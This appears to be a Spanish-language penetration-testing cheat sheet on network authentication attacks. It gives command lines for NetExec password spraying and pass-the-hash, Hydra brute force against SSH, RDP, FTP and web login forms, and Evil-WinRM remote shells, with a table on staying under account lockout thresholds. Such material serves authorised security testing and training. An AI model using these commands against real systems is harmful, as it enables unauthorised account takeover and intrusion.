---
title: "Ataques de Autenticación por Red y Password Spraying"
pubDate: '2026-08-26'
---

Guía técnica de ataques de diccionario, fuerza bruta en línea y Password Spraying contra protocolos de red utilizando herramientas como NetExec, Hydra, Evil-WinRM y Medusa.

---

## ⚡ 1. NetExec (nxc) - Ataques Multiprotocolo

**NetExec** es la herramienta estándar para auditorías de red y ataques de autenticación contra múltiples servicios simultáneamente.

### Instalación y Protocolos Soportados
```bash
sudo apt-get -y install netexec
```

| Módulo / Protocolo | Puerto por Defecto | Propósito Táctico |
| :--- | :--- | :--- |
| `smb` | 445 | Validación de credenciales locales y de dominio, volcado de shares y LSA. |
| `winrm` | 5985 / 5986 | Verificación de acceso para ejecución remota de PowerShell. |
| `ssh` | 22 | Validación de accesos Linux y dispositivos de red. |
| `rdp` | 3389 | Ataques a terminal server y escritorios remotos. |
| `mssql` | 1433 | Validación de usuarios SQL y autenticación integrada de Windows. |
| `ldap` / `ldaps` | 389 / 636 | Consultas y validaciones contra controladores de dominio de Active Directory. |
| `ftp` | 21 | Acceso a servidores de archivos y directorios raíz. |
| `vnc` | 5900 | Validación de autenticación en consolas gráficas VNC. |
| `wmi` | 135 | Validación y ejecución vía WMI/DCOM. |
| `nfs` | 2049 | Inspección y autenticación de montajes de red. |

### Sintaxis General de Uso:
```bash
# Validar un usuario contra una contraseña
nxc <PROTOCOLO> <TARGET_IP> -u <USUARIO> -p <PASSWORD>

# Password Spraying (Una sola contraseña común contra una lista de usuarios)
nxc <PROTOCOLO> <TARGET_IP> -u usuarios.txt -p 'Spring2026!' --continue-on-success

# Ataque de Diccionario (Múltiples usuarios y contraseñas)
nxc <PROTOCOLO> <TARGET_IP> -u usuarios.txt -p passwords.txt

# Ataque con hashes NTLM (Pass-the-Hash)
nxc smb <TARGET_IP> -u 'Administrator' -H <HASH_NTLM>
```

---

## 🗡️ 2. Hydra (Fuerza Bruta de Red Multihilo)

**THC-Hydra** es el motor de cracking en red más rápido para servicios individuales.

### Protocolos Soportados por Hydra:
`adam6500`, `asterisk`, `cisco`, `cisco-enable`, `cobaltstrike`, `cvs`, `firebird`, `ftp[s]`, `http[s]-{head|get|post}`, `http[s]-{get|post}-form`, `http-proxy`, `imap[s]`, `irc`, `ldap2[s]`, `ldap3`, `memcached`, `mongodb`, `mssql`, `mysql`, `nntp`, `oracle-listener`, `oracle-sid`, `pcanywhere`, `pcnfs`, `pop3[s]`, `postgres`, `radmin2`, `rdp`, `redis`, `rexec`, `rlogin`, `rpcap`, `rsh`, `rtsp`, `s7-300`, `sip`, `smb`, `smtp[s]`, `smtp-enum`, `snmp`, `socks5`, `ssh`, `sshkey`, `svn`, `teamspeak`, `telnet[s]`, `vmauthd`, `vnc`, `xmpp`.

### Ejemplos Prácticos de Ataque:
```bash
# Ataque a SSH
hydra -L user.list -P password.list ssh://<TARGET_IP> -t 4

# Ataque a RDP
hydra -L user.list -P password.list rdp://<TARGET_IP> -t 4

# Ataque a FTP
hydra -L user.list -P password.list ftp://<TARGET_IP>

# Ataque a Formulario Web HTTP POST (Login Form)
hydra -l admin -P password.list <TARGET_IP> http-post-form "/login.php:username=^USER^&password=^PASS^:F=incorrect"
```

---

## 🎯 3. Evil-WinRM (Ataque y Acceso a WinRM)

```bash
# Instalación
sudo gem install evil-winrm

# Conexión interactiva directa
evil-winrm -i <TARGET_IP> -u <USERNAME> -p <PASSWORD>

# Conexión cifrada SSL
evil-winrm -i <TARGET_IP> -u <USERNAME> -p <PASSWORD> -S
```

---

## 🛡️ 4. Metodología: Password Spraying vs Fuerza Bruta

| Característica | Password Spraying | Fuerza Bruta Masiva |
| :--- | :--- | :--- |
| **Estrategia** | Prueba **1 única contraseña** muy probable contra toda la lista de usuarios. | Prueba **miles de contraseñas** contra 1 solo usuario. |
| **Riesgo de Bloqueo** | **Muy bajo:** No supera el umbral de intentos fallidos (*Account Lockout Threshold*). | **Muy alto:** Bloquea la cuenta tras 3-5 intentos. |
| **Momento Ideal** | Fase inicial de penetración en Active Directory / Dominio. | Servicios sin política de bloqueo (ej. SSH local, FTP de laboratorio). |
